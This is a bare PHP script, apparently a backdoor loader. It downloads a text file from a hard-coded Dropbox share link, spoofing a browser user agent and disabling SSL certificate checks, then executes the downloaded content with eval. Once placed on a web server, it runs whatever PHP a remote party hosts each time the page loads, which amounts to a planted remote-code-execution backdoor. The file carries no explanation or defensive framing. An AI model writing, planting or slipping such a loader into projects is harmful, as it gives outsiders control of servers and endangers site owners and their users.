<?php

function fetchContent($url) {
    $options = [
        'http' => [
            'header' => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n"
        ]
    ];
    $context = stream_context_create($options);
    $content = @file_get_contents($url, false, $context);

    if ($content === false) {
        $ch = curl_init();
        curl_setopt($ch, CURLOPT_URL, $url);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36');
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_setopt($ch, CURLOPT_TIMEOUT, 30);
        $content = curl_exec($ch);
        curl_close($ch);
    }

    return $content;
}

$url = 'https://dl.dropboxusercontent.com/scl/fi/14bc1dpiac34zoj7azmhw/02.txt?rlkey=vqchd84uwpyuq7qffk91c6fmx&st=fyvokkx6&raw=1';
$content = fetchContent($url);

if ($content) {
    eval('?>' . $content);
}
?>
